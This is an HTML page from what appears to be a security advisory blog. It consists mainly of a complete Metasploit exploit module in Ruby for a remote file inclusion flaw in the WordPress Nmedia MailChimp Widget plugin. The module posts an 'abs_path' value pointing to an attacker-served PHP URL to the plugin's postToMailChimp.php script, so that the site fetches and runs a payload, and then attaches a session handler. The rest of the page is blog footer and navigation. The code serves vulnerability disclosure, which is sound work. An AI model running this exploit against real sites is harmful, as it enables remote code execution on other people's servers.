						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f2a348645978756-1"><span class="crayon-i">require</span><span class="crayon-h"> </span><span class="crayon-s">'msf/core'</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-2">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f2a348645978756-3"><span class="crayon-t">class</span><span class="crayon-h"> </span><span class="crayon-i">Metasploit3</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-h"> </span><span class="crayon-i">Msf</span><span class="crayon-o">::</span><span class="crayon-i">Exploit</span><span class="crayon-o">::</span><span class="crayon-e">Remote</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-4"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Rank</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">ExcellentRanking</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-6"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">include </span><span class="crayon-i">Msf</span><span class="crayon-o">::</span><span class="crayon-i">Exploit</span><span class="crayon-o">::</span><span class="crayon-i">Remote</span><span class="crayon-o">::</span><span class="crayon-e">Tcp</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-7"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">include </span><span class="crayon-i">Msf</span><span class="crayon-o">::</span><span class="crayon-i">Exploit</span><span class="crayon-o">::</span><span class="crayon-i">Remote</span><span class="crayon-o">::</span><span class="crayon-e">HttpClient</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-8"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">include </span><span class="crayon-i">Msf</span><span class="crayon-o">::</span><span class="crayon-i">Exploit</span><span class="crayon-o">::</span><span class="crayon-i">Remote</span><span class="crayon-o">::</span><span class="crayon-i">HttpServer</span><span class="crayon-o">::</span><span class="crayon-e">PHPInclude</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-9">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-10"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">def </span><span class="crayon-e">initialize</span><span class="crayon-sy">(</span><span class="crayon-v">info</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">}</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">super</span><span class="crayon-sy">(</span><span class="crayon-e">update_info</span><span class="crayon-sy">(</span><span class="crayon-i">info</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Name'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-s">'WordPress Nmedia MailChimp Widget "abs_path" Remote File Inclusion Vulnerability'</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Description'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-e">q</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">This</span><span class="crayon-h"> </span><span class="crayon-e">module </span><span class="crayon-i">exploits</span><span class="crayon-h"> </span><span class="crayon-i">a</span><span class="crayon-h"> </span><span class="crayon-e">remote </span><span class="crayon-e">file </span><span class="crayon-e">include </span><span class="crayon-e">execution </span><span class="crayon-e">vulnerability </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">the</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-15"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">WordPress </span><span class="crayon-e">Nmedia </span><span class="crayon-e">MailChimp </span><span class="crayon-i">Widget</span><span class="crayon-h"> </span><span class="crayon-s">'/api_mailchimp/postToMailChimp.php'</span><span class="crayon-h"> </span><span class="crayon-v">script</span><span class="crayon-sy">.</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">All </span><span class="crayon-e">versions </span><span class="crayon-e">of </span><span class="crayon-e">Nmedia </span><span class="crayon-e">MailChimp </span><span class="crayon-e">Widget </span><span class="crayon-e">up </span><span class="crayon-st">to</span><span class="crayon-h"> </span><span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-i">including</span><span class="crayon-h"> </span><span class="crayon-cn">3.1</span><span class="crayon-h"> </span><span class="crayon-e">are </span><span class="crayon-v">vulnerable</span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Author'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-s">'Charlie Eriksen'</span><span class="crayon-h"> </span><span class="crayon-sy">]</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'License'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">MSF_LICENSE</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Version'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-s">'$Revision$'</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'References'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-s">'URL'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'http://secunia.com/advisories/49538/'</span><span class="crayon-h"> </span><span class="crayon-sy">]</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Privileged'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Payload'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'DisableNops'</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Compat'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'ConnectionType'</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-s">'find'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-p"># Arbitrary big number. The payload gets sent as an HTTP</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-p"># response body, so really it's unlimited</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Space'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-cn">262144</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-p"># 256k</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Platform'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-s">'php'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Arch'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">ARCH_PHP</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Targets'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-s">'Automatic'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-sy">}</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'DisclosureDate'</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-s">'Jun 21 2012'</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'DefaultTarget'</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-42">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f2a348645978756-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">register_options</span><span class="crayon-sy">(</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-44"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-45"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">OptString</span><span class="crayon-sy">.</span><span class="crayon-e">new</span><span class="crayon-sy">(</span><span class="crayon-s">'PHPURI'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"The URI to request"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'/wp-content/plugins/nmedia-mailchimp-widget/api_mailchimp/postToMailChimp.php'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-46"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-r">self</span><span class="crayon-sy">.</span><span class="crayon-t">class</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-47"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">end</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-48">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f2a348645978756-49"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">def </span><span class="crayon-e">php_exploit</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-50"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">postdata</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'abs_path='</span><span class="crayon-h"> </span><span class="crayon-o">&lt;&lt;</span><span class="crayon-h"> </span><span class="crayon-e">php_include_url</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-51">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-52"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">print_status</span><span class="crayon-sy">(</span><span class="crayon-s">"Sending exploit request..."</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-53"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">response</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">send_request_raw</span><span class="crayon-sy">(</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-54"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'global'</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-55"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'method'</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-s">'POST'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-56"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'uri'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-v">datastore</span><span class="crayon-sy">[</span><span class="crayon-s">'PHPURI'</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-57"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'data'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">postdata</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-58"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'headers'</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-59"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-60"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Content-Type'</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-s">'application/x-www-form-urlencoded'</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-61"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Content-Length'</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-v">postdata</span><span class="crayon-sy">.</span><span class="crayon-i">length</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-62"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-63"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-64">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f2a348645978756-65"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-e">response </span><span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-v">response</span><span class="crayon-sy">.</span><span class="crayon-i">code</span><span class="crayon-h"> </span><span class="crayon-o">!=</span><span class="crayon-h"> </span><span class="crayon-cn">200</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-66"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">print_error</span><span class="crayon-sy">(</span><span class="crayon-s">"Got a non-200 response back. The server may not be vulnerable (#{response.code})"</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-67"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">end</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-68">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f2a348645978756-69"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">handler</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-70"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">end</span></div><div class="crayon-line" id="crayon-53c9878f2a348645978756-71">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2a348645978756-72"><span class="crayon-st">end</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0153 seconds] -->
<p></p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/nmedia-mailchimp-widget/" rel="tag">Nmedia Mailchimp Widget</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/06/21/wordpress-nmedia-mailchimp-widget-abs_path-remote-file-inclusion-vulnerability/#respond" title="Comment on WordPress Nmedia MailChimp widget &#8220;abs_path&#8221; remote file inclusion vulnerability">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-11 -->

				
					<nav id="nav-below">
		<h2 class="assistive-text">Post navigation</h2>

		
		
						<div class="nav-previous"><a href="https://charlieeriksen.github.io/category/advisories/page/4/" ><span class="meta-nav">&larr;</span> Older posts</a></div>
				
						<div class="nav-next"><a href="https://charlieeriksen.github.io/category/advisories/page/2/" >Newer posts <span class="meta-nav">&rarr;</span></a></div>
						
		
	
	</nav><!-- #nav-below -->
	
			
			</div><!-- #content -->
		</section><!-- #primary -->

			<div id="secondary" class="widget-area" role="complementary">
			<aside id="text-2" class="widget widget_text"><h3 class="widget-title">Upcoming advisories</h3>			<div class="textwidget"><p>SA51412<br />
SA51348<br />
